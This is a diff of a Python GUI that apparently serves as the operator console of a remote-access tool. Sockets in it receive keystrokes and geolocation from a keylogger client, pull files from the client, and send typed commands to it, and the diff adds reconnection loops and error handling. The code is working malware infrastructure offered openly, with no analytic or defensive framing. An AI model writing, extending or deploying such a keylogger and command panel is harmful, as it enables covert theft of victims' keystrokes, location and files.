@@ -17,13 +17,13 @@ class App(customtkinter.CTk):
 
     # Socket IP adresses and PORTS
     filename_transfer_SOIP = "127.0.0.2"
-    filename_transfer_SOPORT = "65433"
+    filename_transfer_SOPORT = 65433
     file_transfer_SOIP = "127.0.0.4"
-    file_transfer_SOPORT = "1930"
+    file_transfer_SOPORT = 1930
     cli_SOIP = "127.0.0.1"
-    cli_SOPORT = "12345"
+    cli_SOPORT = 12345
     keylog_SOIP = "127.0.0.89"
-    keylog_SOPORT = "65230"
+    keylog_SOPORT = 65230
 
     # Important Strings
     sep = ":***:"
@@ -37,8 +37,6 @@ class App(customtkinter.CTk):
         # create 2x2 grid system
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure((0, 3), weight=1)
-
-  
         ############################################################################################
         #                                        UI design                                         #
         ############################################################################################
@@ -99,8 +97,6 @@ class App(customtkinter.CTk):
                                height=500)
         self.frame2.grid(row=0, column=2, sticky="s")
 
-
-
         self.entry = customtkinter.CTkEntry(master=self.frame2,
                                placeholder_text="CTkEntry",
                                width=400,
@@ -111,47 +107,85 @@ class App(customtkinter.CTk):
 
         self.button = customtkinter.CTkButton(master=self.frame2,height=25,fg_color="green", command=self.send_to_client,text="Submit")
         self.button.grid(row=2, column=2,padx = 10, sticky="nw")
-        
         ###########################################################################################
         #                                        System                                           #
         ###########################################################################################
+        #! CLI SOCKET SEGMENT
+        def start_CLI_socket():
+            t3 = threading.Thread(target=create_CLI_socket)
+            t3.daemon = True
+            t3.start()
+
+        def create_CLI_socket():
+            global cli
+            HOST = self.cli_SOIP  # Standard loopback interface address (localhost)
+            PORT = self.cli_SOPORT  # Port to listen on (non-privileged ports are > 1023)
+            # Start  CLI socket
+            while True:
+                try:    
+                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    cli.connect((HOST,PORT))
+                    print("CLI_Success: Connected to CLI client.")
+                    # Add the cli socket only once to the list
+                    if cli not in self.SERVER_SOCKETS:
+                        self.SERVER_SOCKETS.append(cli) 
+                    break
+                except Exception as e: print(f"Thrown Exception CLI: {e}")
+                time.sleep(3)
+            #? Checks if the client is still connected
+            while True:
+                print("Checking client status.")
+                try: cli.send(bytes("TEST DATA", "utf-8")) #? Send data to see if Client is online
+                except Exception as e: 
+                    if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
+                    else: #? If not try to reconnect untill the client goes online
+                        try: 
+                            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            cli.connect((HOST,PORT))
+                            print("CLI_Success: Reconnected with the client.")
+                            if cli not in self.SERVER_SOCKETS: self.SERVER_SOCKETS.append(cli) 
+                        except: print(f"CLI Reconnection error: {e}")
+                time.sleep(3)
+        start_CLI_socket()    
+
         #? KEYLOGGER SOCKET
         def startSocket():
+            print("\nServer started the keylog socket.")
             t2 = threading.Thread(target=createKeylogSocket)
             t2.daemon = True
             t2.start()
-            print("Server started the keylog socket.")
+            
 
         def createKeylogSocket():
             HOST = self.keylog_SOIP  # Standard loopback interface address (localhost)
             PORT = self.keylog_SOPORT  # Port to listen on (non-privileged ports are > 1023)
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                # Add the server socket to a list
-                self.SERVER_SOCKETS.append(s)
-                # Continue
-                s.bind((HOST, PORT))
-                print("KEYLOGGER: Listening for Keylog clients.")
-                self.textbox.insert("0.0", "KEYLOGGER TEXT INFO\n")
-                s.listen()
-                conn, addr = s.accept()
-                self.CLIENT_IP.append(addr)
-                with conn:
-                    print(f"KEYLOGGER: Connected by {addr}")
-                    # Recieve geo data before key logging
-                    self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
-                    self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
-                    while True:
-                        data = conn.recv(1024).decode("utf-8") 
-                        self.textbox.insert("0.0", f"{data[1:-1]}\n") 
-                        #print(data)
+            while True:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    self.SERVER_SOCKETS.append(s)
+                    # Continue
+                    s.bind((HOST, PORT))
+                    self.textbox.insert("0.0", "KEYLOGGER TEXT INFO\n")
+                    s.listen()
+                    conn, addr = s.accept()
+                    self.CLIENT_IP.append(addr)
+                    with conn:
+                        print(f"KEYLOGGER: Connected by {addr}")
+                        self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
+                        self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
+                        while True:
+                            try: 
+                                data = conn.recv(1024).decode("utf-8") 
+                                self.textbox.insert("0.0", f"{data[1:-1]}\n")
+                            except: print("\nKeylogger connection reset.\n"); break 
         startSocket()
         
         #? FILE_TRANSFER SOCKET
         def start_file_name_socket():
+            print("\nDICT_TRANSFER: Server started.")
             t4 = threading.Thread(target=create_file_name_socket)
             t4.daemon = True
             t4.start()
-            print("DICT_TRANSFER: Server started.")
+            
 
         def create_file_name_socket():
             HOST = self.filename_transfer_SOIP  # Standard loopback interface address (localhost)
@@ -161,7 +195,7 @@ class App(customtkinter.CTk):
                 self.SERVER_SOCKETS.append(s)
                 # Continue
                 s.bind((HOST, PORT))
-                print("DICT_TRANSFER: Listening for clients.")
+                print("DICT_TRANSFER: Listening for clients.\n")
                 s.listen()
                 conn, addr = s.accept()
                 self.CLIENT_IP.append(addr)
@@ -173,21 +207,20 @@ class App(customtkinter.CTk):
                     print(data)
       
         def start_file_transfer_socket():
+            print("\nFILE_TRANSFER: Server started.")
             t5 = threading.Thread(target=create_file_transfer_socket)
             t5.daemon = True
             t5.start()
-            print("FILE_TRANSFER: Server started.")
+            
 
         def create_file_transfer_socket():
             HOST = self.file_transfer_SOIP
             PORT = self.file_transfer_SOPORT
 
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                # Make a top Level progress bar  
+                # TODO Make a top Level progress bar  
                 textbox = customtkinter.CTkTextbox(self, width=550, height=330)
                 textbox.grid(row=0, column=2)
-                #textbox.insert("0.0", "FILE TRANSFER BYTE INFO")
-
                 # Create the Socket
                 s.bind((HOST, PORT))
                 s.listen()
@@ -205,7 +238,6 @@ class App(customtkinter.CTk):
                         while len(msg) < msg_size:
                             msg = conn.recv(77).decode("utf-8") # ! 64b(File bytes) + 13b(HEADER) 
                             #print(f"{len(msg)}, {msg}\n")
-
                         msg = msg.replace(" ","")
                         if msg:
                             
@@ -234,11 +266,15 @@ class App(customtkinter.CTk):
                                     #print(f"\nWriting to TXT file: {data}")
                                     filesize = int(data)
                                     while True:
-                                        msg = conn.recv(64).decode("utf-8")
+                                        if filesize < -3000: break
+                                        try: msg = conn.recv(64).decode("utf-8")
+                                        except Exception as e: print(str(e))
                                         if filesize < 0 and "::END_OF_THE_SOCKET::" in msg: 
                                             cmd = ""
                                             msg = ""
-                                            print("Recieved the Trailer.")        
+                                            print("Recieved the Trailer.")
+                                            new_file.close()     
+                                            textbox.insert("0.0", f"\nFile transfered!\n")   
                                             break
                                         new_file.write(msg)
                                         filesize = filesize-64
@@ -249,70 +285,22 @@ class App(customtkinter.CTk):
                                         print("---------------------")
        
                                 case "FINISH":
-                                    print("NIHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
+                                    print("\n")
                                     print(f"\nClosing the file: {msg}")
-                                    new_file.close()
+                                    #textbox.insert("0.0", f"\nAll files transfered!\n")
+                                    #new_file.close()
                                     cmd = ""
          
         start_file_name_socket()
         start_file_transfer_socket()
-
-        #! CLI SOCKET SEGMENT
-        def start_CLI_socket():
-            t3 = threading.Thread(target=create_CLI_socket)
-            t3.daemon = True
-            t3.start()
-
-
-        # TODO handle rappid disconnection from the client
-        def create_CLI_socket():
-            global cli
-            HOST = self.cli_SOIP  # Standard loopback interface address (localhost)
-            PORT = self.cli_SOPORT  # Port to listen on (non-privileged ports are > 1023)
-
-            #? This makes sure that we dont loose connection for too long
-            def wake_up():
-                wake_tries = 0
-                time.sleep(10)
-                try:
-                    cli.connect((HOST,PORT))
-                    print("CLI: Success: Established new CLI connection.")
-                    wake_tries = 0
-                except Exception as e: print(f"Thrown Exception CLI_Wake_Up: {e}") 
-                
-                #? After 100 minutes of no connection kill the socket
-                wake_tries+=1
-                if wake_tries >= 600:
-                    print("CLI_Error: Chosen client is offline, terminating socket.")
-                    cli.close() 
-                    self.SERVER_SOCKETS.remove(cli)
-                wake_up()
-
-            # Start  CLI socket
-            added = False
-            while True:
-                time.sleep(3)
-                try:    
-                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    cli.connect((HOST,PORT))
-                    print("CLI_Success: Connected to CLI client.")
-                    # Add the cli socket only once to the list
-                    if added == False:
-                        self.SERVER_SOCKETS.append(cli) 
-                        added = True
-                    break
-                except Exception as e: print(f"Thrown Exception CLI: {e}")
-                #wake_up()
-
-        start_CLI_socket()    
-    
     ############################################################################################
     #                                        Functions                                         #
     ############################################################################################
     def send_to_client(self):
         global cli
         data = self.entry.get()
-        cli.send(bytes(f"{data}", "utf-8"))
+        try: cli.send(bytes(f"{data}", "utf-8"))
+        except: pass
         print(f"Sent: {data}, to Client")
             
     def showFiles(self):
@@ -325,9 +313,9 @@ class App(customtkinter.CTk):
                 socket.shutdown(socket.SHUT_RDWR)
                 socket.close()
                 self.SERVER_SOCKETS.remove(socket)
-            print("KILLSWITCH: Succsesfully shutdown all connections.")
+            print("\n!!! KILLSWITCH: Succsesfully shutdown all connections. !!!\n")
         except:
-            print("KILLSWITCH_Error: Socket shutdown. Prob no sockets to close.")
+            print("\n!!! KILLSWITCH_Error: Socket shutdown. Prob no sockets to close. !!!\n")
 
 
     def openScanner(self):
